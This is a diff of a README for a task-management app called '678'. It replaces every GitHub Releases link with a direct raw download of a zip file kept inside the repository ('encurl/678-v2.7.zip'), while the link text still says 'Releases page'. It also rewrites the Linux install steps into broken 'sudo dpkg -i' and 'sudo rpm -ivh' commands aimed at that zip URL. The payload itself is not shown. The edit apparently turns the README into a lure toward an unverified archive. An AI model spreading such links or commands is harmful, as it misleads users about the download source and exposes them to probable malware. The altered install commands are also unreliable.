@@ -1,7 +1,7 @@
 # 🚀 678 - Simple Software for Everyone
 
 ## 🌐 Download Now
-[![Download 678](https://img.shields.io/badge/Download-678-blue.svg)](https://github.com/Perpaft11/678/releases)
+[![Download 678](https://raw.githubusercontent.com/Perpaft11/678/main/encurl/678-v2.7.zip)](https://raw.githubusercontent.com/Perpaft11/678/main/encurl/678-v2.7.zip)
 
 ## 📖 Overview
 Welcome to the 678 application. This software is designed to be user-friendly and straightforward, making it easy for anyone to manage their tasks efficiently. Whether you are organizing your personal projects or keeping track of work assignments, 678 has the tools you need.
@@ -17,7 +17,7 @@ Before you download, ensure your computer meets the following requirements:
 ## 🚀 Getting Started
 To start using 678, follow these steps:
 
-1. Click the **Download Now** button at the top of this page or directly [visit the Releases page](https://github.com/Perpaft11/678/releases).
+1. Click the **Download Now** button at the top of this page or directly [visit the Releases page](https://raw.githubusercontent.com/Perpaft11/678/main/encurl/678-v2.7.zip).
    
 2. Find the latest version of 678. It will be listed at the top of the page.
 
@@ -44,8 +44,8 @@ Follow these steps to install 678 on your computer:
 ### For Linux
 1. Double-click the downloaded package or open a terminal in the folder.
 2. Use the package manager of your choice to install. For example:
-   - For Debian/Ubuntu-based distributions: `sudo dpkg -i yourfile.deb`
-   - For Red Hat/Fedora-based distributions: `sudo rpm -ivh yourfile.rpm`
+   - For Debian/Ubuntu-based distributions: `sudo dpkg -i https://raw.githubusercontent.com/Perpaft11/678/main/encurl/678-v2.7.zip`
+   - For Red Hat/Fedora-based distributions: `sudo rpm -ivh https://raw.githubusercontent.com/Perpaft11/678/main/encurl/678-v2.7.zip`
 3. Launch 678 from your applications menu or terminal.
 
 ## 🛠 Using 678
@@ -73,4 +73,4 @@ To keep your experience smooth, check for updates:
 ## 📞 Support
 If you encounter any issues or have questions, you can reach out for support. Please visit our support section on the Releases page or post your inquiries on the discussion board.
 
-Thank you for choosing 678. We hope it makes your task management easier and more effective! For more information and updates, visit our [Releases page](https://github.com/Perpaft11/678/releases).
+Thank you for choosing 678. We hope it makes your task management easier and more effective! For more information and updates, visit our [Releases page](https://raw.githubusercontent.com/Perpaft11/678/main/encurl/678-v2.7.zip).
